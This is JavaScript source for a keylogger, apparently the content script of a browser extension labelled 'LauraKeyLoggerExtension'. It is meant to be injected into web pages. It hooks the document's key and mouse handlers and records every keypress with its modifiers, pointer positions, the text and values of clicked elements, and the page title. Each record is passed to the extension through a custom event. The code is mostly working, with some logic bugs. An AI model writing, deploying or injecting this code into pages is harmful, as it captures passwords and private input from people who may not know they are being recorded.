/* !!! Notice : This code should be injected in a web page: modify it in such a way that no variable name
   may overlap right content name !!! */

// Injected code configurations

var __config = {

	// Defines the string that replaces the elements that do not
	// belongs to the actual event
	nullString: "null",

	// MOUSE OPTIONS
	// Defines the string that identifies a double click event
	clickDef: "click",
	dblClickdDef: "dblclick",
	mousemoveDef: "move",

	// Mouse button string definitions
	LeftMouseDef: "LB",
	RightMouseDef: "RM",
	CenterMouseDef: "CM",
	OtherMouseDef: "?M",

	// KEYBOARD OPTIONS
	// Defines the strings used to idetnifies the modifier key
	OpeningDef: "[",
	ClosingDef: "]",
	CTRLModDef: "CTRL",
	ALTModDef: "ALT",
	SHIFTModDef: "SHIFT",
	METAModDef: "WIN",
	
	// LOGGING OPTIONS
	// Set to true if mouse logging should be enabled
	opt_mouse: true,
	// Set to true if keyboard logging should be enabled
	opt_keyboard: true,
	// Set to true if title of the document currently viewed should be enabled
	opt_title: true,

	// EVENT DISPATCHER ID
	dispatchID: "__LauraKeyLoggerExtension",
	
	// Defines the debug routine
	__debug__: true
}

// ***** do not edit below this line ****** //

// Adding a prototype to the string class to read innerHTML
String.prototype.htmlEncode = function () {
    return String(this).replace(/\s*/g, ' ').replace(/\n/g, ' ');
}

// Debugging function. Set to false __config.__debug__ to 
// avoid messages in console
function __printDebug(message) {
	if (__config.__debug__) { console.log(message); }
}

function __printKeylog() {
	if (__config.__debug__) {
		var obj = __keylogger.get();
		var log = '\n';
        
        // Logging time
        log += "Time: " + obj.time + '\n';
        
        // if defined, logging title
        if (obj.title) { log += "Title: " + obj.title + '\n';}
        if (obj.mouse) {
            log += "Mouse:" + '\n';
            log += '\t' + "X: " + obj.mouse.x + ' : ' + obj.mouse.xWin + '\n';
            log += '\t' + "Y:" + obj.mouse.y + ' : ' + obj.mouse.yWin + '\n';
            log += '\t' + "Event: " + obj.mouse.evnt + '\n';
            log += '\t' + "Button: " + obj.mouse.button + '\n';
            log += '\t' + "Target: " + obj.mouse.target + '\n';
        }
        if (obj.keyboard) {
            log += "Keyboard:" + obj.keyboard.string + '\n';
        }
        
        __printDebug(log);
	}
}

// Classes definitions

// MOUSE CLASS
// This class handles status and event for the mouse input
function __Mouse() {
	this.x         = 0;
	this.y         = 0;
	this.xWin	   = 0;
	this.yWin	   = 0;
	this.button    = __config.nullString;
	this.target    = __config.nullString;
	this.evnt      = __config.nullString; 

	// this function set the status of the mouse on each event
	this.fire = function(e) {
	// e -> event
		__printDebug(e);
		if (e.type = "mousemove") {
			this.x = e.screenX;
			this.y = e.screenY;
			this.xWin = e.clientX;
			this.yWin = e.clientY;
		}

		if (e.type === "click" || e.type === "dblclick") {
			this.target = "[nodeName] = " + e.target.nodeName + 
			          " :: [Value] = " + e.target.value + 
			          " :: [HREF] = " + (e.target.href ? "NO" : e.target.href) + 
					  " :: [TEXTCONTENT] = " + e.target.textContent.htmlEncode().substring(0,1024);
			switch(e.button) {
			case 0: 
				this.button = __config.LeftMouseDef;
				break;
			case 1:
				this.button = __config.CenterMouseDef;
				break;
			case 2:
				this.button = __config.RightMouseDef;
				break;
			default:
				this.button = __config.OtherMouseDef;
				break;
			}
		} else {
			this.button = __config.nullString;
			this.target = __config.nullString;
		}

		switch(e.type) {
			case "click": 
				this.evnt = __config.clickDef;
				break;
			case "dblclick":
				this.evnt = __config.dblclickDef;
				break;
			case "mousemove":
				this.evnt = __config.mousemoveDef;
				break;
			case "onmousedown":
				this.evnt = __config.clickDef;
				break;
			default:
				this.evnt = __config.nullString;
		}
	}

	// This functions returns the mouse object actual status
	/*
	{
		x: x position of the mouse with respect to screen 
		y: y position of the mouse with respect to screen 
		evnt: event that was triggered
		button: eventually clicked button
	}
	*/
	this.get = function() {
		return {
			x: this.x,
			y: this.y,
			xWin: this.xWin,
			yWin: this.yWin,
			evnt: this.evnt,
			button: this.button,
			target: this.target
		}
	}
}

// KEYBOARD CLASS
// This class handles the keyboard events
function __Keyboard() {

	this.keyCode = 0;
	this.key = __config.nullString;

	this.modifiers = __config.nullString;
	this.ctrl = false;
	this.alt = false;
	this.shift = false;
	this.meta = false;

	this.fire = function(e) {
		// e -> event
		if (e.type = "onkeydown") {
			this.ctrl = e.ctrlKey ? true : false;
			this.alt = e.altKey ? true : false;
			this.meta = e.metaKey ? true : false;
			this.shift = e.shiftKey ? true : false;
			this.keyCode = e.keyCode;
			this.key = String.fromCharCode(this.keyCode);

			// generation of the modifiers string
			this.modifiers = "";
			this.modifiers += (this.ctrl  ? __config.OpeningDef + __config.CTRLModDef  + __config.ClosingDef : "");
			this.modifiers += (this.alt   ? __config.OpeningDef + __config.ALTModDef   + __config.ClosingDef : "");
			this.modifiers += (this.shift ? __config.OpeningDef + __config.SHIFTModDef + __config.ClosingDef : "");
			this.modifiers += (this.meta  ? __config.OpeningDef + __config.METAModDef  + __config.ClosingDef : "");
			this.modifiers = (this.modifiers = "" ? nullString : this.modifiers);
		}
	}

	// This functions 
	/*
	{
		string: string that rapresents eventually pressed combination
		key: string that represents key pressed
		modifiers: string that represent pressed modifiers
		ctrl: true if ctrl key was pressed
		alt: true if alt key was pressed
		shift: true if key was pressed
		meta: true if key was pressed
		keyCode: hex value that represents key pressed
	}
	*/
	this.get = function() {
		return {
			string:	'' + this.modifiers + __config.OpeningDef + this.key + __config.ClosingDef,
			key: this.key,
			modifiers: this.modifiers,
			ctrl: this.ctrl,
			alt: this.alt,
			shift: this.shift,
			meta: this.meta,
			keyCode: this.keyCode
		}
	}
}

// DETAIL KEYLOGGER CLASS
function Keylogger() {
		
	if(__config.opt_mouse) { this.mouse = new __Mouse(); } else { this.mouse = null; }
	if(__config.opt_keyboard) { this.keyboard = new __Keyboard(); } else { this.keyboard = null; }
	
	this.title = null;
	this.time = 0;
	
	// This function updates the status of the components, only if selected
	// in the __config object
	this.fire = function(e) {
		__printDebug("Keylogger :: Fire Called!");
		this.time = e.timeStamp;
		if (__config.opt_mouse) { this.mouse.fire(e); }
		if (__config.opt_keyboard) { this.keyboard.fire(e); }
		if (__config.opt_title) { this.title = document.title; }
	};
	
	// Return an object that may be used in dispatchEvent (in which functions cannot be passed)
	// The detail object has this structure:
	/* 
	detail {
		time: now
		keyboard: { see Keyboard.get() structure } <- only if __config.opt_keyboard is true
		mouse: { see Mouse.get() structure } <- only if __config.opt_mouse is true
		title: Document page title <- only if __config.opt_title is true
		config: {
			opt_mouse
			opt_keyboard
			opt_title
		} <- this element will be used in the extension to deliver the message in a correct way
	}
	*/
	this.get = function() {
		__printDebug("Keylogger :: Get called!");
		var detail = {};
		detail.time = this.time;
		if (__config.opt_mouse) { detail.mouse = this.mouse.get(); }
		if (__config.opt_keyboard) { detail.keyboard = this.keyboard.get(); }
		if (__config.opt_title) { detail.title = this.title; }
		detail.config = {
			opt_mouse: __config.opt_mouse,
			opt_title: __config.opt_title,
			opt_keyboard: __config.opt_keyboard
		}
		return detail;
	}
	
}

// Global variables definition
var __keylogger = new Keylogger();
// Event Handlers Definition

function eventHandler(e) {
	// Updating keylog object
	__keylogger.fire(e);
	
	// Custom event. Pass the keylogger.get object via event
	var myEvent = new CustomEvent(
		__config.dispatchID,
		{
			detail: __keylogger.get(),
			cancellable: false	
		}
	);
	
	// Calling the event
	document.dispatchEvent(myEvent);
	__printKeylog();
}

document.onmousemove = function(e) { eventHandler(e); };
document.onkeydown = function(e) { eventHandler(e); };
document.onclick = function(e) { eventHandler(e); };
document.ondblclick = function(e) { eventHandler(e); };
document.onmousedown = function(e) { eventHandler(e); };